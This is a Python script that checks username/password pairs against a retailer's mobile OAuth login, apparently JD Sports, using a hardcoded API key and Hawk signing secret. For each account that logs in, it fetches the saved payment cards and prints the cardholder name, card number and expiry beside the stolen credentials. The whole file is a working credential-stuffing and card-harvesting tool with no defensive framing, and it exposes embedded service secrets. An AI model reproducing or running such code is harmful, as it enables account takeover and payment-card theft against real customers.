import mohawk
import requests


def solver(username, password):
    data = f"username={username}&grant_type=password&password={password}&client_id=com.jd.jdwomen"
    headerss = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=utf-8",
        "user-agent": "asdsad"
    }
    sweety = requests.post(
        "https://prod.jdgroupmesh.cloud/oauth2/jdsportsuk/token?channel=iphone-women&api_key"
        "=4CE1177BB983470AB15E703EC95E5285",
        data=data, headers=headerss)
    if "access_token" in sweety.text:
        tk = sweety.json()["access_token"]
        link = sweety.json()["customerID"]
        link.replace("\"", "")
        url = f"{link}/paymentCards?displayadyencards=1"
        content = ''
        content_type = 'application/json'
        sender = mohawk.Sender({'id': 'd1bdff50c5',
                                'key': '3442497330233aecfe132ddfbbd4d46d',
                                'algorithm': 'sha256'}, url, "GET", content=content, content_type=content_type)
        headers = {
            "x-api-key": "4CE1177BB983470AB15E703EC95E5285",
            "X-Request-Auth": sender.request_header,
            "authorization": f"Bearer {tk}"}

        r = requests.get(
            f'{link}/paymentCards?displayadyencards=1',
            headers=headers)
        try:
            card = r.json()["cards"][0]["cardNumber"]
            exp_date = r.json()["cards"][0]["expiryDate"]
            sweetyyy = r.json()["cards"][0]["requiresSecurityCode"]
            FullName = r.json()["cards"][0]["clientName"]
            print(
                username + ":" + password + " >>> " + FullName + " | " + card + " | " + exp_date + " | " + f"requiresSecurityCode? = {sweetyyy}")
        except Exception:
            pass
    elif "invalid_credentials" in sweety.text:
        print("Fail Account")
    elif "You are not authorised to view this customer" in sweety.text:
        print("Account can't be viewaccess")
